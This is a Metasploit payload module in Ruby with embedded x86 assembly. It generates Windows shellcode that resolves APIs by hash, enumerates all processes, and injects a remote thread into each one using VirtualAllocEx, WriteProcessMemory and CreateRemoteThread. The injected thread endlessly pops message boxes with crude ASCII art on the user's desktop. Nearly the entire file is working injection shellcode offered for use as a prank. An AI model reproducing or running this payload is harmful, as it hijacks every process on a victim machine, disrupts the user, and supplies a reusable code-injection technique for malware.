require 'msf/core'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Kanamara Matsuri',
			'Description'   => 'Simulate the Japanese Kanamara Matsuri festival on the active user\'s desktop.',
			'Author'        =>
				[
					'frank2 <frank2 [turning] dc949 [japanese] org>'
				],
			'License'       => MSF_LICENSE,
			'Version'       => "8D", # just some random hex. I don't know what to put here!
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
		))

		# customize the kanamara festival!
		register_options(
			[
				OptInt.new('LENGTH', [ true, "The length of the Kanamara Matsuri parade.", 8 ]),
				OptString.new('ROUTE', [ false, "The route for the parade to take. Options: front, rear, center, none.", 'none' ]),
				OptBool.new('STREAMERS', [ false, "Allow the participants of the Kanamara Matsuri parade to use streamers.", false ]),
				OptBool.new('ANIMATED', [ false, "Animate the parade.", false ])
			], self.class)

		options.remove_option('EXITFUNC')
	end

	def string_push(s)
		result = Array.new
		s << "\x00"

		if s.size % 4
			s << "\x00" * (4 - (s.size % 4))
		end

		while s.size != 0
			numeric = s.unpack('L')
			result << 'push 0x%X' % numeric
			s = s[4..-1]
		end

		result.reverse
	end

	def kanamaraloop
		if datastore['ANIMATED']
			kanamara_length = datastore['LENGTH'].to_i

			if kanamara_length < 6
				kanamara_length = 6
			end

			if datastore['ROUTE'] == 'none'
				frames = [
					'8oOOo%sD' % [ '=' * (kanamara_length - 4) ],
					'8%soOOoD' % [ '=' * (kanamara_length - 4) ]
				]

				if datastore['STREAMERS']
					frames << '8oOOo%sD~~~~' % [ '=' * (kanamara_length - 4) ]
				end
			else
				if datastore['ROUTE'] == 'front'
					receiver_frames = [' ^O ^', '==) ^']
				elsif datastore['ROUTE'] == 'rear'
					receiver_frames = [' (_(_)', '===(_)']
				else
					receiver_frames = [' ({})', '===})']
				end

				matsuri = '8%sD' % [ '=' * kanamara_length ]

				frames = [
					'%s %s' % [ matsuri, receiver_frames[0] ],
					'%s%s' % [ matsuri[0..2], receiver_frames[1] ]
				]

				if datastore['STREAMERS']
					frames << '%s~~~~ %s' % [ matsuri, receiver_frames[0] ]
				end
			end

			display_frames = Array.new

			frames.each do|frame|
				pushes = string_push(frame)
				stack_size = pushes.size
				pushes << 'push esp'
				pushes << 'push 0x30'
				pushes << 'push dword [esp+4]'
				pushes << 'push dword [esp+8]'
				pushes << 'push 0'
				pushes << 'call ebx'
				pushes << 'add esp,0x%x' % ((stack_size+4) * 4)

				display_frames << pushes.join("\n\t")
			end

			display_frames = display_frames.join("\n\t")
			parade_data = <<EOS
kanamaraLoop:
		#{display_frames}
		jmp kanamaraLoop
EOS
		else
			if datastore['LENGTH'] < 2
				datastore['LENGTH'] = 2
			end

			matsuri = '8%sD' % [ '=' * datastore['LENGTH'] ]

			if datastore['STREAMERS']
				matsuri << '~~~~'
			end

			if datastore['ROUTE'] == 'front'
				if datastore['LENGTH'] <= 4
					matsuri << ' ;. ;'
				else
					matsuri << ' ^O ^'
				end
			elsif datastore['ROUTE'] == 'rear'
				matsuri << ' (_(_)'
			elsif datastore['ROUTE'] == 'center'
				matsuri << ' ({})'
			end

			pushed_matsuri = string_push(matsuri).join("\n\t")

			parade_data = <<EOS
		#{pushed_matsuri}
		push  esp

kanamaraLoop:
		push  0x30                          ; MB_OK | MB_ICONEXCLAMATION
		push  dword [esp+4]
		push  dword [esp+8]
		push  0
		call  ebx
		jmp   kanamaraLoop
EOS
		end

		return parade_data
	end

	# Construct the payload
	def generate
		matsuris = kanamaraloop()
		payload_data = <<EOS
#define  roff(a)        (a-beginData)
#define  rdata(a)       [ebp+roff(a)]

#define  delink         mov   esi,[esi]\\\n\tpush  esi
#define  endlinks       pop   esi
#define  nextlink       endlinks\\\n\tdelink

#define  linkimg        dword [esi+0x18]

#define  leai(a)        push  a
#define  leal(a)        lea   eax,a\\\n\tpush  eax\\\n\tcall  LoadLibraryA\\\n\tpush  eax
#define  leaf(a)        push  dword [esp]\\\n\tpush  a\\\n\tcall  GetFuncByHash\\\n\tmov   a,eax
#define  endl           add   esp,4

#define  scframe        call  getDataOffset

#define  peb_ldr(p)     dword [p+0xC]
#define  ldr_list(p)    dword [p+0xC]

#define  scinit         scframe\\\n\txor   ecx,ecx\\\n\tmov   esi,[fs:ecx+0x30]\\\n\tmov   esi,peb_ldr(esi)\\\n\tmov   esi,ldr_list(esi)

#define  NtQueryInformationProcess  dword rdata(funcNtQueryInformationProcess)
#define  RtlExitUserThread          dword rdata(funcRtlExitUserThread)
#define  LoadLibraryA               dword rdata(funcLoadLibraryA)
#define  OpenProcess                dword rdata(funcOpenProcess)
#define  VirtualAllocEx             dword rdata(funcVirtualAllocEx)
#define  ReadProcessMemory          dword rdata(funcReadProcessMemory)
#define  WriteProcessMemory         dword rdata(funcWriteProcessMemory)
#define  CreateRemoteThread         dword rdata(funcCreateRemoteThread)
#define  EnumProcesses              dword rdata(funcEnumProcesses)
#define  MessageBoxA                dword rdata(funcMessageBoxA)
#define  GetProcessWindowStation    dword rdata(funcGetProcessWindowStation)
#define  GetUserObjectInformationA  dword rdata(funcGetUserObjectInformationA)
#define  malloc                     dword rdata(funcMalloc)
#define  free                       dword rdata(funcFree)

#define  PSAPIString                dword rdata(szPSAPI)
#define  MSVCRTString               dword rdata(szMSVCRT)

		scinit                           ; initialize our shellcode

		delink                           ; ntdll image
		leai(linkimg)                    ; ntdll.dll image data
		leaf(NtQueryInformationProcess)
		leaf(RtlExitUserThread)
		endl

		nextlink                         ; kernel32 image
		leai(linkimg)                    ; kernel32.dll image data
		leaf(LoadLibraryA)
		leaf(OpenProcess)
		leaf(VirtualAllocEx)
		leaf(ReadProcessMemory)
		leaf(WriteProcessMemory)
		leaf(CreateRemoteThread)
		endl
		endlinks

		leal(PSAPIString)
		leaf(EnumProcesses)
		endl

		leal(MSVCRTString)
		leaf(malloc)
		leaf(free)
		endl

		push  0x1000
		call  malloc                           ; allocate data for pProcessIds
		add   esp,4                            ; grumble
		push  eax                              ; push the buffer onto the stack
		lea   eax,dword rdata(dwBytesOut)      ; address for pBytesReturned
		push  eax                              ; pBytesReturned
		push  0x1000                           ; cb
		push  dword [esp+8]                    ; pProcessIds
		call  EnumProcesses
		test  eax,eax
		jz    bailOut                          ; EnumProcesses failed, bail.

		shr   dword rdata(dwBytesOut),2        ; number of process IDs

		xor   ebx,ebx                       ; proc id counter

threadInjectLoop:
		xor   edx,edx
		mov   eax,[esp]                     ; get the proc id array
		push  dword [eax+ebx*4]             ; current proc id
		push  edx                           ; don't inherit handles
		push  0x43A                         ; create thread, query information,
		call  OpenProcess                   ; vm operation, vm write, vm read
		test  eax,eax
		jz    openProcessFailure            ; NOPE GUESS NOT

		mov   dword rdata(dwProcessHandle),eax

		push  0x18                          ; size of PROCESS_BASIC_INFORMATION
		call  malloc                        ; allocate the data
		pop   ecx
		mov   dword rdata(dwProcBasicInfo),eax
		lea   edx,dword rdata(dwScratchData); scratch variable
		push  edx
		push  ecx
		push  dword rdata(dwProcBasicInfo)  ; pointer to our basic info thing
		xor   edx,edx
		push  edx                           ; it's fucking late right now
		push  dword rdata(dwProcessHandle)  ; like 5:00AM late, srs
		call  NtQueryInformationProcess     ; I'm tired and I want a kanamara parade!
		test  eax,eax
		jnz   basicInfoFailure

		mov   edx,dword rdata(dwProcBasicInfo) ; get the basic proc info block
		mov   edx,[edx+4]                   ; get the peb pointer
		test  edx,edx
		jz    basicInfoFailure              ; PPEB is null, bail
		mov   dword rdata(dwPPEB),edx

		push  0x1D8                         ; size of the PEB
		push  dword rdata(dwPPEB)
		push  dword rdata(dwProcessHandle)
		call  ReadRemotePointer
		test  eax,eax
		jz    basicInfoFailure

		mov   dword rdata(dwPPEBHeap),eax
		mov   eax,peb_ldr(eax)              ; get the PLDR from the PEB table
		test  eax,eax
		jz    readLDRFailure

		push  0x1C                          ; LDR size
		push  eax                           ; LDR pointer
		push  dword rdata(dwProcessHandle)  ; process handle
		call  ReadRemotePointer
		test  eax,eax
		jz    readLDRFailure

		; at this point we've acquired the LDR linked-list. we can iterate over
		; stuff now.
		mov   dword rdata(dwLDR),eax
		mov   eax,ldr_list(eax)             ; get the linked list data
		mov   dword rdata(dwFirstLink),eax  ; Win7 has circular links! WTF!?
		test  eax,eax
		jz    readListFailure

findUser32:
		push  0x48
		push  eax
		push  dword rdata(dwProcessHandle)
		call  ReadRemotePointer
		test  eax,eax
		jz    readListFailure

		mov   dword rdata(dwLDRLink),eax    ; save it so we can free it up later
		push  dword [eax+0x20]              ; image size :D :D :D
		push  dword [eax+0x18]              ; image base pointer. :D
		push  dword rdata(dwProcessHandle)  ; process handle!
		call  ReadRemotePointer
		test  eax,eax
		jz    readImageFailure

		; THIS PART IS THE MOST DISGUSTING PART OF THIS SHELLCODE AND I HATE IT
		; AUUUUUUGH
		mov   dword rdata(dwLDRImage),eax
		pushad
		push  eax
		push  MessageBoxA
		call  GetFuncByHash
		mov   dword rdata(dwMessageBoxAddress),eax
		test  eax,eax
		popad
		jnz   foundUser32

		push  dword rdata(dwLDRImage)
		call  free                          ; free the image
		pop   eax
		mov   eax,dword rdata(dwLDRLink)
		mov   eax,[eax]
		push  eax
		push  dword rdata(dwLDRLink)
		call  free                          ; free the previous thing
		pop   edx
		pop   eax
		test  eax,eax
		jnz   findUser32
		cmp   eax,dword rdata(dwFirstLink)  ; if we hit this link, bail
		jnz   findUser32
		jmp   endOfListFailure

foundUser32:
		; now that we know it's user32, get the other functions too!
		pushad
		push  dword rdata(dwLDRImage)
		push  GetProcessWindowStation
		call  GetFuncByHash
		mov   dword rdata(dwGetProcWindowStationAddress),eax

		push  dword rdata(dwLDRImage)
		push  GetUserObjectInformationA
		call  GetFuncByHash
		mov   dword rdata(dwGetUserInfoAddress),eax
		popad

		; rebase the function pointers
		mov   edi,dword rdata(dwLDRLink)
		mov   edi,[edi+0x18]

		lea   eax,rdata(dwMessageBoxAddress)
		push  eax
		push  edi
		push  dword rdata(dwLDRImage)
		call  RebasePointer

		lea   eax,rdata(dwGetProcWindowStationAddress)
		push  eax
		push  edi
		push  dword rdata(dwLDRImage)
		call  RebasePointer

		lea   eax,rdata(dwGetUserInfoAddress)
		push  eax
		push  edi
		push  dword rdata(dwLDRImage)
		call  RebasePointer

		; fix the call instructions
		lea   edi,dword rdata(processWindowKanamaras)
		mov   esi,dword rdata(dwGetProcWindowStationAddress)
		mov   [edi],esi

		lea   edi,dword rdata(userObjectKanamaras)
		mov   esi,dword rdata(dwGetUserInfoAddress)
		mov   [edi],esi

		lea   edi,dword rdata(messageBoxKanamaras)
		mov   esi,dword rdata(dwMessageBoxAddress)
		mov   dword [edi],esi

		lea   esi,dword rdata(kanamarasEverywhere)
		lea   edi,dword rdata(endKanamaras)
		sub   edi,esi

pebSuccess:
		xor   edx,edx
		push  0x40                          ; PAGE_EXECUTE_READWRITE
		push  0x3000                        ; MEM_COMMIT | MEM_RESERVE
		push  edi                           ; the size of our thread code
		push  edx                           ; base address (don't care)
		push  dword rdata(dwProcessHandle)  ; proc handle
		call  VirtualAllocEx                ; VirtualAllocEx
		test  eax,eax
		jz    openProcessFailure

		push  eax                           ; save our new thread target
		lea   eax,dword rdata(dwScratchData); pointer to our scratch var
		push  eax                           ; lpNumberOfBytesWritten
		push  edi                           ; nSize
		push  esi                           ; code buffer
		push  dword [esp+0xC]               ; pointer to our new thread
		push  dword rdata(dwProcessHandle)
		call  WriteProcessMemory
		test  eax,eax
		jz    openProcessFailure

		xor   edx,edx
		lea   eax,dword rdata(dwScratchData); pointer to our scratch var
		push  eax                           ; lpThreadId
		push  edx                           ; run the thread immediately. :D
		push  edx                           ; we've got plenty of kanamaras, thanks.
		push  dword [esp+0xC]               ; start address
		push  edx                           ; default stack size
		push  edx                           ; default security attributes
		push  dword rdata(dwProcessHandle)  ; process handle
		call  CreateRemoteThread            ; KANAMARA MATSURI!!

		pop   eax                           ; get that remote buffer outta here
		push  dword rdata(dwLDRImage)
		call  free
		pop   eax

readImageFailure:
		push  dword rdata(dwLDRLink)
		call  free                          ; free the buffer
		pop   eax                           ; bad image read

endOfListFailure:
readListFailure:
		push  dword rdata(dwLDR)
		call  free
		pop   eax                           ; bad link

readLDRFailure:
		push  dword rdata(dwPPEBHeap)
		call  free                          ; free the buffer
		pop   eax

basicInfoFailure:
		push  dword rdata(dwProcBasicInfo)
		call  free
		pop   eax

openProcessFailure:
		inc   ebx
		cmp   ebx,dword rdata(dwBytesOut)
		jne   threadInjectLoop

bailOut:
		call  free                          ; free the malloc'd buffer
		add   esp,4                         ; grumble grumble cdecl grumble

		xor   eax,eax
		push  eax
		call  RtlExitUserThread             ; exit the thread

ebpPopper:
		pop   ebp
		ret

getDataOffset:
		call  ebpPopper

beginData:

funcNtQueryInformationProcess:   dd    0xF9D16EC4
funcRtlExitUserThread:           dd    0xAD0E91D8
funcLoadLibraryA:                dd    0xCF504303
funcOpenProcess:                 dd    0xA6DCF0E0
funcVirtualAllocEx:              dd    0x23DBAF6A
funcReadProcessMemory:           dd    0xDEDD01E5
funcWriteProcessMemory:          dd    0x0B5BED78
funcCreateRemoteThread:          dd    0x6F561C77
funcEnumProcesses:               dd    0x12169AD9
funcMalloc:                      dd    0x85E13641
funcFree:                        dd    0x52E36357
funcMessageBoxA:                 dd    0xD0123BEE
funcGetProcessWindowStation:     dd    0xEF42AFF6
funcGetUserObjectInformationA:   dd    0x245208EC
dwBytesOut:                      dd    0x554E4441
dwScratchData:                   dd    0x554E4441
dwProcessHandle:                 dd    0x554E4441
dwMessageBoxAddress:             dd    0x554E4441
dwGetProcWindowStationAddress:   dd    0x554E4441
dwGetUserInfoAddress:            dd    0x554E4441
dwPPEB:                          dd    0x554E4441
dwFirstLink:                     dd    0x554E4441

; heap-based data (i.e., free all this shit)
dwProcBasicInfo:                 dd    0x554E4441
dwPPEBHeap:                      dd    0x554E4441
dwLDR:                           dd    0x554E4441
dwLDRLink:                       dd    0x554E4441
dwLDRImage:                      dd    0x554E4441

; libraries other than kernel32 and ntdll
szPSAPI:                         db    'psapi.dll',0
szMSVCRT:                        db    'msvcrt.dll',0

kanamarasEverywhere:
		push  ebp
		mov   ebp,esp
		sub   esp,0x104
		db    0xBE                 ; mov esi,imm
processWindowKanamaras:
		dd    0x554E4441

		db    0xBF                 ; mov edi,imm
userObjectKanamaras:
		dd    0x554E4441

		db    0xBB                 ; mov ebx,imm
messageBoxKanamaras:
		dd    0x554E4441

		call  esi                  ; GetProcessWindowStation
		test  eax,eax
		jz    noKanamarasThankYou

		push  0
		push  0x104
		lea   edx,dword [ebp-104]
		push  edx
		push  2                    ; UOI_NAME
		push  eax                  ; dat handle
		call  edi
		test  eax,eax
		jz    noKanamarasThankYou

		mov   eax,dword [ebp-101]
		cmp   eax,0x30617453       ; Sta0, aka the desktop
		jne   noKanamarasThankYou

		#{matsuris}

noKanamarasThankYou:
		add   esp,0x104
		pop   ebp
		xor   eax,eax
		ret   4

endKanamaras:
GetFuncByHash:
		mov   ebx,[esp+8]
		cmp   word [ebx],0x5A4D    ; it's that Zbikowski guy!
		jnz   exportFail
		mov   edx,[ebx+0x3C]       ; dos->e_lfanew
		add   edx,ebx
		cmp   dword [edx],0x4550   ; show that coach who's REALLY boss!
		jnz   exportFail
		mov   eax,[edx+0x78]       ; export data
		test  eax,eax
		jz    exportFail
		add   eax,ebx
		mov   esi,[eax+0x20]       ; AddressOfNames
		test  esi,esi
		jz    exportFail
		add   esi,ebx
		xor   ecx,ecx
		push  ebx
		push  eax

searchForFunc:
		mov   edi,[esi+ecx*4]
		add   edi,[esp+4]
		mov   eax,0x554E4441
		cdq
		push  0x75DB2EFF

hashString:
		movzx ebx,byte [edi]
		test  ebx,ebx
		jz    finishHash

		imul  dword [esp], eax        ; metasm gets grumpy unless I say eax!
		xor   eax,ebx
		inc   edi
		jmp   hashString

finishHash:
		add   esp,4
		cmp   eax,[esp+0xC]
		jz    foundHash
		inc   ecx
		mov   edx,[esp]
		cmp   ecx,[edx+0x18]          ; NumberOfNames
		jge   hashFail
		jmp   searchForFunc

foundHash:
		pop   esi
		pop   ebx
		mov   edi,[esi+0x1c]
		add   edi,ebx
		mov   edx,[esi+0x24]
		add   edx,ebx
		movzx eax,word [edx+ecx*2]
		mov   eax,[edi+eax*4]
		add   eax,ebx

hashEnd:
		ret   8

hashFail:
		add   esp,8
exportFail:
		xor   eax,eax
		jmp   hashEnd

RebasePointer:
		;  esp+4:   old base
		;  esp+8:   new base
		;  esp+C:   target pointer

		mov   edx,dword [esp+0xC]
		mov   eax,dword [esp+4]
		sub   [edx],eax
		mov   eax,dword [esp+8]
		add   [edx],eax
		ret   0xC

ReadRemotePointer:
		;  esp+4:   handle
		;  esp+8:   lpBaseAddress
		;  esp+C:   size

		push  dword [esp+0xC]
		call  malloc                        ; allocate data for the PEB
		pop   ecx
		push  eax
		lea   edx,dword rdata(dwScratchData); scratch variable
		push  edx
		push  ecx
		push  dword [esp+8]
		push  dword [esp+0x18]
		push  dword rdata(dwProcessHandle)
		call  ReadProcessMemory             ; ReadProcessMemory
		test  eax,eax
		jz    remoteReadFailure
		pop   eax

remoteReadReturn:
		ret   0xC

remoteReadFailure:
		call  free
		add   esp,4
		xor   eax,eax
		jmp   remoteReadReturn
EOS
		payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
	end
end
